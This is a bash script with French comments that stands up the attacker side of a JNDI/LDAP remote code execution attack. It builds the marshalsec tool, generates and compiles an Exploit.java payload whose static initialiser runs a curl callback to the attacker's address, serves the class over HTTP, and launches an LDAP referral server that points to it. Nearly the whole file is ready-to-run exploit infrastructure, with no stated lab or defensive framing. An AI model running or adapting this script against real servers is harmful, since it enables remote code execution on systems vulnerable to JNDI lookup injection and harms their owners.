#!/bin/bash
set -e

ATTACKER_IP=$(hostname -I | awk '{print $1}')
PAYLOAD_DIR="exploit_payload"
MARSHALSEC_DIR="marshalsec"

echo "[*] Adresse IP attaquant : $ATTACKER_IP"

# 1. Cloner et compiler marshalsec
if [ ! -d "$MARSHALSEC_DIR" ]; then
  echo "[*] Clonage de marshalsec..."
  git clone https://github.com/mbechler/marshalsec.git
fi

cd $MARSHALSEC_DIR
echo "[*] Compilation de marshalsec..."
mvn clean package -DskipTests
cd ..

# 2. Créer dossier payload et Exploit.java
mkdir -p $PAYLOAD_DIR

cat > $PAYLOAD_DIR/Exploit.java << EOF
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://$ATTACKER_IP:8888/pwned");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

echo "[*] Compilation de Exploit.java..."
javac $PAYLOAD_DIR/Exploit.java

# 3. Lancer le serveur HTTP pour payload
echo "[*] Démarrage serveur HTTP sur le port 8000..."
cd $PAYLOAD_DIR
python3 -m http.server 8000 &
HTTP_PID=$!
cd ..

# 4. Lancer le serveur LDAP marshalsec
echo "[*] Démarrage serveur LDAP marshalsec sur le port 1389..."
java -cp $MARSHALSEC_DIR/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://$ATTACKER_IP:8000/#Exploit

# 5. Nettoyage
trap "echo 'Arrêt du serveur HTTP'; kill $HTTP_PID" EXIT
